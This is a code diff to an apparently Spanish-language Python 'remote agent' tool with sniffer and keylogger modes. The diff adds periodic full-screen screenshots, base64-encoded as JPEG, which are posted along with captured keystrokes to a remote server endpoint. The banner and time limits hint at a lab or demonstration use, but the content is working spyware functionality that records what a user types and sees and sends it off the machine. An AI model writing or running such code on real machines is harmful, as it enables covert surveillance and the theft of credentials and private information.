@@ -25,8 +25,18 @@ import sys
 import threading
 import time
 from datetime import datetime
+import base64
+import io
 
 import requests
+
+# Captura de pantalla
+try:
+    import mss
+    from PIL import Image
+    _SCREENSHOT_OK = True
+except ImportError:
+    _SCREENSHOT_OK = False
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -74,6 +84,24 @@ def get_local_ip():
             return s.getsockname()[0]
     except Exception:
         return '127.0.0.1'
+
+
+def _take_screenshot_b64():
+    """Toma una captura de pantalla y la devuelve como Base64 JPEG. None si falla."""
+    if not _SCREENSHOT_OK:
+        return None
+    try:
+        with mss.mss() as sct:
+            raw = sct.grab(sct.monitors[0])
+            img = Image.frombytes('RGB', raw.size, raw.bgra, 'raw', 'BGRX')
+            if img.width > 1280:
+                ratio = 1280 / img.width
+                img = img.resize((1280, int(img.height * ratio)), Image.LANCZOS)
+            buf = io.BytesIO()
+            img.save(buf, format='JPEG', quality=65)
+            return base64.b64encode(buf.getvalue()).decode('utf-8')
+    except Exception:
+        return None
 
 
 def post_to_server(server_url: str, endpoint: str, payload: dict, token: str):
@@ -284,9 +312,11 @@ def _flush_packets(server_url, token, packets, agent_ip, final=False):
 # ─────────────────────────────────────────────────────────────────────────────
 # MODO KEYLOGGER REMOTO
 # ─────────────────────────────────────────────────────────────────────────────
-def run_remote_keylogger(server_url: str, token: str, duration: int):
+def run_remote_keylogger(server_url: str, token: str, duration: int,
+                         screenshot_interval: int = 5):
     """
-    Registra teclas en la máquina local y las envía al servidor central.
+    Registra teclas y toma capturas de pantalla periódicas en la máquina local
+    y los envía al servidor central.
     """
     try:
         import keyboard
@@ -296,6 +326,7 @@ def run_remote_keylogger(server_url: str, token: str, duration: int):
 
     agent_ip = get_local_ip()
     keys_buffer = []
+    screenshots_buffer = []
 
     print(f"\n{'='*55}")
     print(f"  ⌨️  Agente Remoto — Modo KEYLOGGER")
@@ -303,6 +334,8 @@ def run_remote_keylogger(server_url: str, token: str, duration: int):
     print(f"  IP de este agente : {agent_ip}")
     print(f"  Servidor destino  : {server_url}")
     print(f"  Duración          : {duration} segundos")
+    print(f"  Capturas          : cada {screenshot_interval}s {'(desactivado)' if screenshot_interval == 0 else ''}")
+    print(f"  Captura pantalla  : {'✅ disponible' if _SCREENSHOT_OK else '❌ instala mss y Pillow'}")
     print(f"{'='*55}\n")
 
     # Registrar agente
@@ -320,7 +353,7 @@ def run_remote_keylogger(server_url: str, token: str, duration: int):
         print(f"[ERROR] Token inválido o servidor rechazó la conexión: {reg.get('error')}")
         sys.exit(1)
 
-    print(f"  ✅ Agente registrado. Capturando teclas durante {duration}s...")
+    print(f"  ✅ Agente registrado. Capturando durante {duration}s...")
     print(f"  ⌨️  Escribe en cualquier ventana...\n")
 
     SPECIAL_KEYS = {
@@ -371,6 +404,32 @@ def run_remote_keylogger(server_url: str, token: str, duration: int):
     stop_event = threading.Event()
     keyboard.on_press(on_key)
 
+    # ── Hilo de capturas de pantalla ───────────────────────────────────
+    if screenshot_interval > 0 and _SCREENSHOT_OK:
+        def screenshot_loop():
+            idx = 0
+            while not stop_event.is_set():
+                stop_event.wait(screenshot_interval)
+                if stop_event.is_set():
+                    break
+                img_b64 = _take_screenshot_b64()
+                if img_b64:
+                    idx += 1
+                    scr = {
+                        'index': idx,
+                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                        'agent_ip': agent_ip,
+                        'data': img_b64
+                    }
+                    screenshots_buffer.append(scr)
+                    print(f"  📸 Captura #{idx} tomada ({len(img_b64)//1024} KB)")
+                    # Enviar captura inmediatamente
+                    _flush_keys(server_url, token, [], agent_ip,
+                                screenshots=[scr])
+        scr_thread = threading.Thread(target=screenshot_loop, daemon=True)
+        scr_thread.start()
+        print(f"  📸 Capturas de pantalla activadas (cada {screenshot_interval}s)")
+
     timer = threading.Timer(duration, stop_event.set)
     timer.start()
     stop_event.wait()
@@ -379,14 +438,17 @@ def run_remote_keylogger(server_url: str, token: str, duration: int):
 
     # Flush final
     _flush_keys(server_url, token, keys_buffer, agent_ip, final=True)
-    print(f"\n  ✅ Captura finalizada. {len(keys_buffer)} teclas enviadas al servidor.")
+    print(f"\n  ✅ Captura finalizada.")
+    print(f"  ⌨️  {len(keys_buffer)} teclas enviadas al servidor.")
+    print(f"  📸 {len(screenshots_buffer)} capturas de pantalla enviadas.")
 
 
-def _flush_keys(server_url, token, keys, agent_ip, final=False):
-    """Envía un lote de teclas al servidor."""
+def _flush_keys(server_url, token, keys, agent_ip, screenshots=None, final=False):
+    """Envía un lote de teclas y opcionalmente capturas al servidor."""
     post_to_server(server_url, 'agent/push-keys', {
         'agent_ip': agent_ip,
         'keys': keys,
+        'screenshots': screenshots or [],
         'final': final
     }, token)
 
@@ -419,6 +481,8 @@ Ejemplos:
                         help='[Sniffer] Interfaz de red (default: automática)')
     parser.add_argument('--duration', type=int, default=10,
                         help='[Keylogger] Duración en segundos (default: 10, máx: 60)')
+    parser.add_argument('--screenshot-interval', type=int, default=5, dest='screenshot_interval',
+                        help='[Keylogger] Cada cuántos segundos tomar captura de pantalla (0=desactivar, default: 5)')
 
     args = parser.parse_args()
 
@@ -440,7 +504,8 @@ Ejemplos:
         run_remote_keylogger(
             server_url=args.server,
             token=args.token,
-            duration=args.duration
+            duration=args.duration,
+            screenshot_interval=args.screenshot_interval
         )
 
 
